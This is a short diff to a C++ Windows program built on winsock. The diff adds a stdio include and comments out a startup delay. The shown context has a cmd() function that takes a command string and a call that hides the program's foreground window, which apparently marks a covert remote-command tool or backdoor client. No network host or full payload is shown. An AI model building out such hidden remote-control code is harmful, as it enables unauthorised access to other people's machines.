@@ -1,4 +1,4 @@
-
+#include <stdio.h>
 #include<iostream>
 #include<winsock.h>
 //mingw编译命令 g++ -o xxx.exe xxx.cpp -lws2_32
@@ -63,7 +63,7 @@ int cmd(char *cmdStr, char *message)
 }
 
 int main() {
-	Sleep(2000);//需要延迟，不然会报错
+	//Sleep(2000);//需要延迟，不然会报错
 	ShowWindow(GetForegroundWindow(),0);
 	//定义长度变量
 	int send_len=0,recv_len=0,len=0;
